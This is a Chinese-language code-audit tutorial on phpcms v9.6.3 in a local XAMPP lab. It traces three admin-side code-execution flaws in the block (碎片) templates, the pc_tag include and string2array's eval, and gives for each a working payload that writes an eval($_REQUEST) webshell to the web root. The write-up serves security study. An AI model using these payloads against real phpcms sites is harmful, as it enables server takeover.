# 安装环境
windows10 + xmapp  
xmapp的Apache HTTP端口设为8080

# 调试环境
phpstorm + Xdebug +  chrome Xdebug helper

# 安装phpcms
1. 在xmapp安装文件夹htdocs文件夹内新建一个文件夹，用来放php的程序代码，我的命名习惯是cms名称+版本号，例如在这里我的
命名是phpcms_v9.6.3
2. 到[phpcms官网](http://download.phpcms.cn/v9/9.6/phpcms_v9.6.3_UTF8.zip)下载代码，解压后将install_package文件夹内的文件
复制到第一步创建的文件夹内。
3. 访问`http://127.0.0.1:8080/phpcms_v9.6.3/install`安装cms

# cms基本结构
网上的一些分析文章基本上都是跳过功能点去直接分析漏洞，这对不熟悉这套cms的人或新手来说十分的不友好。在这里我简单的分析
一下这套cms的结构。
### 前台和后台
普通用户用的就是前台，url为index.php。管理员用的就是后台，url为admin.php.
一般来说前台的相同级别的漏洞危害远远比后台大。

### 模块
phpcms的功能可以在`模块 > 模块管理 > 模块管理 >`  里面查看。如下，  
![模块管理](https://raw.githubusercontent.com/greatyy/codeAudit/master/codeaudit101/imgs/modules.PNG) 

注意看“模块目录”这一列， 这里对应的是代码里面的`phpcms/modules`目录下的各个功能点， 当我们看代码找到可利用的
漏洞时， 可在这里找到对应的功能点去验证。

# url构造和核心函数
1. url构造方式： phpcms是通过m, c, a三个参数来控制访问的php函数的。当不传时，这三个参数的默认值为
```angular2
m: 默认值为content，
c:  默认值为index,
a:  默认值为init
``` 
表示当前url用 phpcms/modules/content/index.php 内的init方法处理。以此类推。  

2. 核心函数。核心函数基本都在phpcms/base.php文件里，使用频率很高，建议记住。
```
load_sys_class: 当调用load_sys_class时，到 phpcms/libs/classes目录下找xx.class.php

load_app_class: 当调用load_app_class时，到phpcms/modules/模块名/classes/目录下找xx.class.php

load_model: 当调用load_model时，到phpcms/model目录下找xx.class.php

如果$initialize=1时，包含类文件并实例化类，反之，仅包含类文件
```
那么就开始分析具体的漏洞吧。

# GET SHELL 1

phpcms/modules/block/block_admin.php  238行

```php
public function public_view() {
    $id = isset($_GET['id']) && intval($_GET['id']) ? intval($_GET['id']) :  exit('0');
    if (!$data = $this->db->get_one(array('id'=>$id))) {
        showmessage(L('nofound'));
    }
    if ($data['type'] == 1) {
        exit('<script type="text/javascript">parent.showblock('.$id.', \''.str_replace("\r\n", '', $_POST['data']).'\')</script>');
    } elseif ($data['type'] == 2) {
        extract($data);
        unset($data);
        $title = isset($_POST['title']) ? $_POST['title'] : '';
        $url = isset($_POST['url']) ? $_POST['url'] : '';
        $thumb = isset($_POST['thumb']) ? $_POST['thumb'] : '';
        $desc = isset($_POST['desc']) ? $_POST['desc'] : '';
        $template = isset($_POST['template']) && trim($_POST['template']) ? trim($_POST['template']) : '';
        $data = array();
        foreach ($title as $key=>$v) {
            if (empty($v) || !isset($url[$key]) ||empty($url[$key])) continue;
            $data[$key] = array('title'=>$v, 'url'=>$url[$key], 'thumb'=>$thumb[$key], 'desc'=>str_replace(array(chr(13), chr(43)), array('<br />', '&nbsp;'), $desc[$key]));
        }
        $tpl = pc_base::load_sys_class('template_cache');
        $str = $tpl->template_parse(new_stripslashes($template));
        $filepath = CACHE_PATH.'caches_template'.DIRECTORY_SEPARATOR.'block'.DIRECTORY_SEPARATOR.'tmp_'.$id.'.php';
        $dir = dirname($filepath);
        if(!is_dir($dir)) {
            @mkdir($dir, 0777, true);
        }
        if (@file_put_contents($filepath,$str)) {
             ob_start();
             include $filepath;
             $html = ob_get_contents();
             ob_clean();
             @unlink($filepath);
        }
```
注意那个"include":`include $filepath;`  
跟进"$filepath":
```
$str = $tpl->template_parse(new_stripslashes($template));
$filepath = CACHE_PATH.'caches_template'.DIRECTORY_SEPARATOR.'block'.DIRECTORY_SEPARATOR.'tmp_'.$id.'.php';
```
跟进"$template":  
```
$template = isset($_POST['template']) && trim($_POST['template']) ? trim($_POST['template']) : '';
```
可以看到，$template直接由post取来，没经过任何处理,那么只要构造一下传过恶意数据来即可。

由前面模块管理可知， block对应的功能是“碎片”， 那么到碎片管理用用功能，看下url可知此函数对应功能为
碎片管理的预览按钮。由上面的template_parse找到构造数据包的规则，构造数据如下：  
```
{php file_put_contents("phpcms_shell.php",'<?php eval($_REQUEST[1]);?>');}
```  
![预览](https://raw.githubusercontent.com/greatyy/codeAudit/master/codeaudit101/imgs/public_view.PNG)  
点击“预览”按钮。可看到在根目录下生成了shell    
![webshell_1](https://raw.githubusercontent.com/greatyy/codeAudit/master/codeaudit101/imgs/webshell_1.PNG)

漏洞原因： 未对template参数进行过滤，导致代码执行。这个漏洞利用点和危险点都在同一个函数内，应该比较容易找到。

# GET SHELL 2
这个漏洞也在碎片管理的功能内。  
phpcms/modules/block/classes/block_tag.class.php  48行  
```php
/**
 * 生成模板返回路径
 * @param integer $id 碎片ID号
 * @param string $template 风格
 */
public function template_url($id, $template = '') {
    $filepath = CACHE_PATH.'caches_template'.DIRECTORY_SEPARATOR.'block'.DIRECTORY_SEPARATOR.$id.'.php';
    $dir = dirname($filepath);
    if ($template) {
        if(!is_dir($dir)) {
            mkdir($dir, 0777, true);
        }
        $tpl = pc_base::load_sys_class('template_cache');
        $str = $tpl->template_parse(new_stripslashes($template));
        @file_put_contents($filepath, $str);
    } else {
        if (!file_exists($filepath)) {
            if(!is_dir($dir)) {
                mkdir($dir, 0777, true);
            }
            $tpl = pc_base::load_sys_class('template_cache');
            $str = $this->db->get_one(array('id'=>$id), 'template');
            $str = $tpl->template_parse($str['template']);
            @file_put_contents($filepath, $str);
        }
    }
    return $filepath;
}
```
注意这句： 
```
@file_put_contents($filepath, $str);
```
那么需要达成代码执行漏洞需要两点：  
1. 传入参数$template可控  
2. 有函数include了这个$filepath   

一般来说只要不做限制，只有条件1就能达成了，但是phpcms几乎在每个php文件的前面
都加上了
```
?php 
defined('IN_PHPCMS') or exit('No permission resources.'); 
```
导致还需要条件2才能执行代码。  
全局搜一下`pc_base::load_app_class('block_tag')`, 发现在phpcms/modules/block/block_admin.php的
block_update函数有用到：
```
if ($template) {
    $block = pc_base::load_app_class('block_tag');
    $block->template_url($id, $template);
}
```
跟进$template:
```
$template = isset($_POST['template']) && trim($_POST['template']) ? trim($_POST['template']) : '';
```
nice! 第一点达成。第二点呢？
template_url函数的注释写明了“生成模板返回路径”，那么先找找哪儿调用了这个函数
， 巧的是，同一个文件的pc_tag函数就调用了它：
```
public function pc_tag($data) {
    $siteid = isset($data['siteid']) && intval($data['siteid']) ? intval($data['siteid']) : get_siteid();
    $r = $this->db->select(array('pos'=>$data['pos'], 'siteid'=>$siteid));
    $str = '';
    if (!empty($r) && is_array($r)) foreach ($r as $v) {
        if (defined('IN_ADMIN') && !defined('HTML')) $str .= '<div id="block_id_'.$v['id'].'" class="admin_block" blockid="'.$v['id'].'">';
        if ($v['type'] == '2') {
            extract($v, EXTR_OVERWRITE);
            $data = string2array($data);
            if (!defined('HTML'))  {
                ob_start();
                include $this->template_url($id);
                $str .= ob_get_contents();
                ob_clean();
            } else {
                include $this->template_url($id);
            }
            
        } else {
            $str .= $v['data'];
        }
        if (defined('IN_ADMIN')  && !defined('HTML')) $str .= '</div>';
    }
    return $str;
}
```
那么，两个条件都达成了。  

### 复现  
到“碎片管理”新增一个碎片：  
![新增碎片](https://raw.githubusercontent.com/greatyy/codeAudit/master/codeaudit101/imgs/addblock.PNG) 
点击确定后跳转到"碎片数据更新"。插入php语句:
```
{php file_put_contents("phpcms_shell2.php",'<?php eval($_REQUEST[1]);?>');}
```
点击确认。  
到网站根目录看看，咦， 怎么没有这个成功生成。 猜想应该是pc_tag函数还没有被调用。
看下phpcms的[pc标签文档](http://v9.help.phpcms.cn/html/2010/tpls_0906/1.html),发现
pc标签是一种类似于查询资源的自定义语句。于是访问下主页， 成功生成了shell。

这个漏洞跟第一个有点相似，所不同的是漏洞利用的终点不同，也多了一步。


# GET SHELL 3
phpcms/libs/functions/global.func.php 283行  
```
/**
* 将字符串转换为数组
*
* @param	string	$data	字符串
* @return	array	返回数组格式，如果，data为空，则返回空数组
*/
function string2array($data) {
	$data = trim($data);
	if($data == '') return array();
	if(strpos($data, 'array')===0){
		@eval("\$array = $data;");
	}else{
		if(strpos($data, '{\\')===0) $data = stripslashes($data);
		$array=json_decode($data,true);
		if(strtolower(CHARSET)=='gbk'){
			$array = mult_iconv("UTF-8", "GBK//IGNORE", $array);
		}
	}
	return $array;
}
```
我们发现这个函数里面用了一个eval函数， eval函数是我们的好朋友。  
全局搜下哪儿调用过这个函数。 如果这个函数的参数$data是可控的，那么表示这里有个漏洞利用点。
[原文](https://nosec.org/home/detail/2120.html)给出了一个利用点，
在phpcms/modules/member/member_model.php文件的37-102行， 我自己也找了一下，
发现还有一个在phpcms/modules/content/sitemodel.php的210行到214行。  
将以下payload存入一个txt文件
```
array(1);$b=file_put_contents("phpcms_shell3.php",'<?php eval($_REQUEST[1]);?>');
```
在`用户 > 会员模型管理 > 管理会员模型 >`中点击"添加会员模型"：  
![string2array](https://raw.githubusercontent.com/greatyy/codeAudit/master/codeaudit101/imgs/string2array.PNG)  
导入上述txt， 可发现成功生成第三个shell  


